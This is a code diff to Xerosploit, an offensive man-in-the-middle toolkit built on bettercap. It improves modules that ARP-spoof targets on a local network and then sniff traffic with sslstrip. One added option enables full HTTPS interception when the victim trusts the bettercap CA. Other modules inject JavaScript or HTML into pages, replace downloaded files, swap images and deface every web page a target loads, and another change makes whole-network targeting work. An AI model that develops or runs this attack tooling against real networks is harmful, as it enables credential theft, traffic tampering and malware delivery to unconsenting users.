@@ -84,6 +84,20 @@ def terminal_argv(title, shell_command):
 	return None
 
 
+def require_input_file(path, what, retry):
+	"""Validate an existing input file, re-prompting via `retry` on failure.
+
+	Returns the absolute path, or None when `retry()` was invoked (the caller
+	must then return without launching bettercap).
+	"""
+	try:
+		return engine.require_file(path, what)
+	except engine.EngineError as exc:
+		print("\033[1;91m\n" + str(exc) + "\n\033[1;m")
+		retry()
+		return None
+
+
 def main():
 	try:
 
@@ -398,6 +412,9 @@ def main():
 								else:
 
 									html_file = html_file.replace("'","")
+									html_file = require_input_file(html_file, "HTML file", inject_html)
+									if html_file is None:
+										return
 									print("\033[1;34m\n[++] Injecting Html code ... \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 									runtime = engine.write_runtime_module("injecthtml.js", {"target_file": html_file})
@@ -447,6 +464,9 @@ def main():
 									print("\033[1;34m\n[++] All ." + ext_rdownload + " files will be replaced by " + file_rdownload + "  \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 									extensions = [e.strip() for e in ext_rdownload.split(",") if e.strip()]
+									file_rdownload = require_input_file(file_rdownload, "replacement file", rdownload)
+									if file_rdownload is None:
+										return
 									runtime = engine.write_runtime_module("replace_file.js", {"extensions": extensions, "target_file": file_rdownload})
 									commands = engine.arp_spoof(target_ips)
 									commands += engine.http_proxy(script=runtime)
@@ -501,15 +521,21 @@ def main():
 										use_sslstrip = action_snif_sslstrip == "y"
 										print("\033[1;34m\n[++] All logs are saved on : " + SNIFF_DIR + " \033[1;m")
 										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
+										use_https_mitm = False
 										if use_sslstrip:
 											print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m \033[1;m")
+											print("\033[1;32m\n[+] Enable full HTTPS interception (needs bettercap CA on the victim)? [y/N]\n\033[1;m")
+											action_https_mitm = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip().lower()
+											use_https_mitm = action_https_mitm in ("y", "yes")
 										else:
 											print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m \033[1;m")
 										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 
 										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
 										filename = target_ips + date
-										filename = filename.replace("\n","")
+										# target_ips can be a CIDR ("192.168.1.0/24") or a comma separated
+										# list; keep the name a single, safe path segment.
+										filename = filename.replace("\n","").replace("/", "_").replace(",", "_")
 										log_path = os.path.join(SNIFF_DIR, filename + ".log")
 										os.system("mkdir -p " + SNIFF_DIR + " && touch " + log_path)
 
@@ -534,7 +560,8 @@ def main():
 										commands += engine.net_sniff(output=os.path.join(SNIFF_DIR, filename + ".pcap"), local=False)
 										if use_sslstrip:
 											commands += engine.http_proxy(sslstrip=True)
-											commands += engine.https_proxy()
+											if use_https_mitm:
+												commands += engine.https_proxy()
 										else:
 											commands += engine.http_proxy()
 										engine.run(up_interface, commands, logfile=os.path.join(SNIFF_DIR, filename + ".log"))
@@ -661,7 +688,13 @@ def main():
 								elif img_replace == "home":
 									home()
 								else:
-									ximage = os.path.join(engine.TMP_DIR, "ximage.png")
+									img_replace = require_input_file(img_replace, "image file", replace)
+									if img_replace is None:
+										return
+									ext = os.path.splitext(img_replace)[1].lower()
+									if not ext:
+										ext = ".png"
+									ximage = os.path.join(engine.TMP_DIR, "ximage" + ext)
 									os.makedirs(engine.TMP_DIR, exist_ok=True)
 									with open(img_replace, "rb") as _img_src:
 										image_bytes = _img_src.read()
@@ -737,7 +770,7 @@ def main():
 								print("\033[1;34m\n[++] Injecting shakescreen.js  ... \033[1;m")
 								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
 								commands = engine.arp_spoof(target_ips)
-								commands += engine.http_proxy(injectjs=engine.script("shakescreen.js"))
+								commands += engine.http_proxy(script=engine.write_runtime_module("shakescreen.js", {}))
 								engine.run(up_interface, commands)
 								shakescreen()
 							else:
@@ -774,11 +807,15 @@ def main():
 								elif js_file == "home":
 									home()
 								else:
+									js_file = require_input_file(js_file, "JavaScript file", inject_j)
+									if js_file is None:
+										return
 
 									print("\033[1;34m\n[++] Injecting Javascript code ... \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
+									runtime = engine.write_runtime_module("injectjs.js", {"js_file": js_file})
 									commands = engine.arp_spoof(target_ips)
-									commands += engine.http_proxy(injectjs=js_file)
+									commands += engine.http_proxy(script=runtime)
 									engine.run(up_interface, commands)
 									inject_j()
 							else:
@@ -818,6 +855,9 @@ def main():
 									home()
 								else:
 									file_deface = file_deface.replace("'","")
+									file_deface = require_input_file(file_deface, "HTML file", deface)
+									if file_deface is None:
+										return
 
 									print("\033[1;34m\n[++] Overwriting all web pages ... \033[1;m")
 									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
@@ -896,7 +936,7 @@ deface      :  Overwrite all web pages with your HTML code\n\033[1;m"""]
 		# if target = all the network
 			elif target_ips == "all": 
 
-				target_ips = ""
+				target_ips = engine.all_targets(up_interface)
 				target_name = "All your network"
 				program0()
 
@@ -1033,6 +1073,10 @@ exit     :  Close Xerosploit.\n\033[1;m"""]
 	except KeyboardInterrupt:
 		print ("\n" + exit_msg)
 		sleep(1)
+	except engine.EngineError as exc:
+		print("\033[1;91m\n" + str(exc) + "\n\033[1;m")
+		sleep(1)
+		sys.exit(1)
 	except Exception:
 		traceback.print_exc(file=sys.stdout)
 	sys.exit(0)
